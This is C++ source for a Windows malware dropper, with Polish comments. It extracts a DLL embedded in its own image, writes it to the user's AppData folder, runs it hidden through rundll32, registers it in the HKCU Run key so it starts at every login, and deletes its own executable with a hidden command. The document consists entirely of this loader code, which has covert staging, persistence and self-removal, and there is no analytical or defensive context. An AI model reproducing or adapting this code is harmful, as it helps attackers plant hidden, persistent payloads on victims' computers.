#include "includes.h"

int DeleteLoadFile() {
    WCHAR winDir[MAX_PATH];
    WCHAR delCmd[MAX_PATH];
    
    if (ExpandEnvironmentStringsW(L"%WINDIR%", winDir, MAX_PATH) > 0) {
        wsprintfW(delCmd, L"%s\\System32\\cmd.exe /c del \"", winDir);
        
        WCHAR appName[MAX_PATH];
        if (GetModuleFileNameW(0, appName, MAX_PATH) == 0) return -1;

        lstrcatW(delCmd, appName);
        lstrcatW(delCmd, L"\"");

        STARTUPINFOW startupInf{ sizeof(startupInf) };
        PROCESS_INFORMATION processInformation{ 0 };
        if (!CreateProcessW(NULL, delCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startupInf, &processInformation)) 
            return -1;
        
        CloseHandle(processInformation.hProcess);
        CloseHandle(processInformation.hThread);

        return 0;
    }

    return -1;
}

INT WINAPI WinMain(HMODULE current, HMODULE previous, LPSTR cmd, INT show) {
    const LPCWSTR runningFunctionName = L"firstEntry"; // Nazwa uruchamianej funkcji z DLL
    PBYTE moduleBase = PBYTE(Tools::GetImageBase());

    if (moduleBase != NULL) {
        DWORD moduleSize = 0;
        PBYTE dllMemory = Tools::ExtractDllFile(moduleBase, &moduleSize);

        WCHAR envPath[MAX_PATH];
        WCHAR finalPath[MAX_PATH];
        WCHAR commandLine[MAX_PATH * 2];
        if (ExpandEnvironmentStringsW(L"%APPDATA%", envPath, MAX_PATH) > 0) {
            wsprintfW(finalPath, L"%s\\%lu.dll", envPath, GetTickCount());

            DWORD bytesWritten = 0;
            HANDLE newFile = CreateFileW(finalPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (newFile != INVALID_HANDLE_VALUE) {
                WriteFile(newFile, dllMemory, moduleSize, &bytesWritten, NULL);
                CloseHandle(newFile);
            }

            WCHAR winDir[MAX_PATH];
            if (ExpandEnvironmentStringsW(L"%WINDIR%", winDir, MAX_PATH) > 0) {
                // "C:\Windows\System32\rundll32.exe" "C:\Sciezka\Plik.dll",Funkcja
                wsprintfW(commandLine, L"\"%s\\System32\\rundll32.exe\" \"%s\",%s", winDir, finalPath, runningFunctionName);

                STARTUPINFOW startupInf = { sizeof(startupInf) };
                PROCESS_INFORMATION processInformation = { 0 };

                if (CreateProcessW(NULL, commandLine, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startupInf, &processInformation)) {
                    HKEY regKey;
                    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &regKey) == ERROR_SUCCESS) {
                        
                        LPCWSTR valueName = L"%s\\%lu"; 
                        DWORD dataSize = (lstrlenW(commandLine) + 1) * sizeof(WCHAR);
                        
                        RegSetValueExW(regKey, valueName, 0, REG_SZ, (LPBYTE)commandLine, dataSize);
                        RegCloseKey(regKey);
                    }

                    CloseHandle(processInformation.hProcess);
                    CloseHandle(processInformation.hThread);
                }
            }
        }
        LocalFree(dllMemory);
    }

	DeleteLoadFile();
    return 0;
}